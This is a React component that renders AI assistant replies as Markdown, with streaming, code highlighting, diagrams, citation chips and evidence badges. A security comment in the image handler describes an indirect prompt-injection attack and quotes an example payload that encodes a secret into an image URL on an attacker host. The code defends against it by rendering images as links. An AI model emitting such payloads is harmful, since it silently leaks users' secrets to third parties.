import { Button } from "@/components/ui";
import { remarkCitations } from "@/lib/remarkCitations";
import { remarkEvidence } from "@/lib/remarkEvidence";
import type { Citation } from "@/types/events";
import {
  type ComponentPropsWithoutRef,
  isValidElement,
  memo,
  useMemo,
  useState,
} from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { CodeBlock, nodeText } from "./CodeBlock";
import { DiagramBlock } from "./Diagram";
import { EvidenceBadge } from "./EvidenceBadge";
import { faviconUrl } from "./Favicon";
import { SourceTooltip } from "./SourcePreview";
import { rehypeCodeMeta } from "./rehypeCodeMeta";
import { splitMarkdownBlocks } from "./streamingMarkdown";

type ReactMarkdownProps = ComponentPropsWithoutRef<typeof ReactMarkdown>;

// Stable references so ReactMarkdown doesn't re-init plugins on every keystroke
// of the streaming content. `rehypeCodeMeta` runs before highlight so a
// `lang:path` fence still highlights (and surfaces its filename header).
const remarkPlugins = [remarkGfm, remarkMath];
// Finished turn: `ignoreMissing` keeps an unknown ```lang from throwing.
const rehypeHighlighted: ReactMarkdownProps["rehypePlugins"] = [
  rehypeCodeMeta,
  [rehypeHighlight, { ignoreMissing: true }],
  rehypeKatex,
];
// While streaming we drop rehype-highlight — re-tokenizing every code block on
// each delta is the dominant streaming cost. Code shows as plain monospace until
// the turn finishes (same defer-while-streaming policy as the diagram blocks),
// then highlights once on the final render below.
const rehypeStreaming: ReactMarkdownProps["rehypePlugins"] = [
  rehypeCodeMeta,
  rehypeKatex,
];

/**
 * One memoized Markdown chunk.
 *
 * The streaming reply is split into a list of top-level blocks
 * ({@link splitMarkdownBlocks}); rendering each as its own memoized chunk lets
 * every finished block skip re-parsing on every delta — only the chunk whose
 * `content` actually changed (the live tail block) re-renders, so a whole turn
 * costs O(total) instead of O(n²). Plugin/component props are stable
 * module-level / memoized refs, so `memo`'s shallow compare holds across deltas.
 */
const MarkdownChunk = memo(function MarkdownChunk({
  content,
  remarkPlugins: remarks,
  rehypePlugins: rehype,
  components,
}: {
  content: string;
  remarkPlugins: ReactMarkdownProps["remarkPlugins"];
  rehypePlugins: ReactMarkdownProps["rehypePlugins"];
  components: Components;
}) {
  return (
    <ReactMarkdown
      remarkPlugins={remarks}
      rehypePlugins={rehype}
      components={components}
    >
      {content}
    </ReactMarkdown>
  );
});

/**
 * A tiny inline favicon for a citation chip. Unlike the card {@link Favicon}, it
 * has NO letter fallback: a missing host or a failed load (common for sites with
 * cert issues) renders nothing, so the chip cleanly degrades to a number-only pill
 * mid-sentence instead of an awkward letter glyph in the reading flow.
 */
function ChipFavicon({ site }: { site?: string }) {
  const domain = site?.trim();
  const [failed, setFailed] = useState(false);
  if (!domain || failed) return null;
  return (
    <img
      src={faviconUrl(domain)}
      alt=""
      loading="lazy"
      onError={() => setFailed(true)}
      className="size-3 shrink-0 rounded-full object-contain"
    />
  );
}

/**
 * A clickable inline citation marker that maps to a source card. Shows the
 * source's favicon (when it loads) before the number so a reader recognizes the
 * site inline; hovering reveals the full source (favicon + title + domain +
 * snippet), matching the source cards below the reply.
 */
function CitationChip({
  n,
  citation,
  onClick,
}: {
  n: number;
  citation?: Citation;
  onClick: () => void;
}) {
  const chip = (
    <Button
      variant="ghost"
      onClick={onClick}
      aria-label={`跳到来源 ${n}`}
      className="mx-0.5 inline-flex h-auto gap-0.5 rounded-full bg-primary/10 px-1.5 align-super text-xs font-medium leading-none text-primary hover:bg-primary/20"
    >
      <ChipFavicon site={citation?.site} />
      {n}
    </Button>
  );
  if (!citation) return chip;
  return (
    <SourceTooltip citation={citation} index={n}>
      {chip}
    </SourceTooltip>
  );
}

interface Props {
  content: string;
  /** Web sources for this message; enables `[n]` (1..count) citation chips with
   * a hover preview of each source. */
  citations?: Citation[];
  /** Invoked with the 1-based source index when a chip is clicked. */
  onCitationClick?: (n: number) => void;
  /** While true, defer rendering ```mermaid/```markmap blocks (a half-written
   * diagram is a syntax error) — they show source until the turn finishes. */
  isStreaming?: boolean;
  /** Render in a muted tone for secondary content (a turn's reasoning), so the
   * structured thinking reads as quieter than the answer body. */
  muted?: boolean;
  /** Debate speech only (举证责任 P3): render inline `【已核实·出处】` / `【待核实·推断】`
   * evidence-status markers as {@link EvidenceBadge} chips. Off everywhere else so the
   * marker convention never leaks into ordinary assistant markdown. */
  evidence?: boolean;
}

/**
 * Assistant-message Markdown: GFM (tables/strikethrough/task lists), syntax
 * highlighting with a per-block copy button, KaTeX math ($…$ / $$…$$),
 * ```mermaid / ```markmap diagrams (rendered via Diagram.tsx), and — when the
 * message has sources — clickable `[n]` citation chips.
 */
export const Markdown = memo(function Markdown({
  content,
  citations,
  onCitationClick,
  isStreaming = false,
  muted = false,
  evidence = false,
}: Props) {
  const citationCount = citations?.length ?? 0;
  // Only enrich once sources exist (they arrive at end-of-turn), so streaming
  // deltas keep using the stable module-level remark plugins. `evidence` (debate
  // speech) appends remarkEvidence; deps-memoized so it stays a stable ref across deltas.
  const remarks = useMemo(() => {
    if (citationCount <= 0 && !evidence) return remarkPlugins;
    return [
      ...remarkPlugins,
      ...(citationCount > 0 ? [remarkCitations(citationCount)] : []),
      ...(evidence ? [remarkEvidence()] : []),
    ];
  }, [citationCount, evidence]);

  const comps = useMemo<Components>(() => {
    // Route ```mermaid / ```markmap / ```vega-lite fences to the diagram
    // renderer; everything else stays the normal copy-button code block. The
    // language regex allows hyphens so "vega-lite" is captured whole.
    const pre = (props: ComponentPropsWithoutRef<"pre">) => {
      const child = props.children;
      const className = isValidElement(child)
        ? ((child.props as { className?: string }).className ?? "")
        : "";
      const lang = /language-([\w-]+)/.exec(className)?.[1] ?? "";
      const kind =
        lang === "mermaid" || lang === "markmap"
          ? lang
          : lang === "vega-lite" || lang === "vega" || lang === "vegalite"
            ? "vega-lite"
            : null;
      if (kind) {
        return (
          <DiagramBlock
            kind={kind}
            code={nodeText(child)}
            streaming={isStreaming}
          />
        );
      }
      return <CodeBlock {...props} />;
    };

    // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
    // image to a click-to-open link — never an auto-loading <img>. ReactMarkdown maps
    // `![](url)` to this component, and no rehype-raw is loaded, so raw <img> HTML in
    // the reply is inert text — this is the ONLY path that can create an image element.
    // Without it, an indirect-injection payload like `![](http://attacker/?d=<secret>)`
    // would fetch on render = a no-click, silent exfil beacon for anything the model was
    // induced to encode in the URL. As a link, egress needs an explicit user click (the
    // same bar as any model-emitted link). Citation favicons go through <Favicon> /
    // <ChipFavicon> (backend proxy, a separate trusted path), so they're unaffected.
    const img = ({ src, alt }: ComponentPropsWithoutRef<"img">) => {
      const href = typeof src === "string" ? src : undefined;
      const label =
        typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
      if (!href) return <>{label}</>;
      return (
        <a
          href={href}
          target="_blank"
          rel="noreferrer"
          className="text-primary underline underline-offset-2"
        >
          {label}
        </a>
      );
    };

    const base: Components =
      citationCount <= 0
        ? { pre, img }
        : {
            pre,
            img,
            a({ href, children, node: _node, ...props }) {
              const m =
                typeof href === "string" ? /^cite:(\d+)$/.exec(href) : null;
              if (m) {
                const n = Number(m[1]);
                return (
                  <CitationChip
                    n={n}
                    citation={citations?.[n - 1]}
                    onClick={() => onCitationClick?.(n)}
                  />
                );
              }
              return (
                <a href={href} target="_blank" rel="noreferrer" {...props}>
                  {children}
                </a>
              );
            },
          };
    // 举证徽章（P3）：remarkEvidence 产出的自定义 `evidencemark` 元素映射到 EvidenceBadge。走
    // data.hProperties 而非 cite: 那种链接 url——后者会被 react-markdown 的 urlTransform 按非安全
    // 协议清空（cite:/evi: 同被清空）。仅辩论发言 opt-in（evidence=true），不扰其余 markdown。
    if (evidence) {
      (base as Record<string, unknown>).evidencemark = EvidenceBadge;
    }
    return base;
  }, [citationCount, citations, onCitationClick, isStreaming, evidence]);

  // While streaming, split into per-block memoized chunks so each finished block
  // parses exactly once (逐块记忆化·Stage 4) — only the live tail re-parses per
  // delta — with highlight deferred (rehypeStreaming). The finished turn renders
  // as one document with highlight, so any cross-block references the conservative
  // split would miss mid-stream resolve in the end state.
  const rehype = isStreaming ? rehypeStreaming : rehypeHighlighted;
  const blocks = isStreaming ? splitMarkdownBlocks(content) : null;

  return (
    <div
      className={`markdown-body ${muted ? "text-muted-foreground" : "text-foreground"}`}
    >
      {blocks ? (
        blocks.map((block, i) => (
          <MarkdownChunk
            // Streaming blocks are an append-only list: block i keeps its identity
            // across deltas (a finished block never moves), so the index is the
            // stable key; MarkdownChunk's content-compare handles the rare
            // tail-boundary flicker before a block finalizes.
            // biome-ignore lint/suspicious/noArrayIndexKey: append-only streaming blocks — index is the stable identity
            key={i}
            content={block}
            remarkPlugins={remarks}
            rehypePlugins={rehype}
            components={comps}
          />
        ))
      ) : (
        <MarkdownChunk
          content={content}
          remarkPlugins={remarks}
          rehypePlugins={rehype}
          components={comps}
        />
      )}
    </div>
  );
});
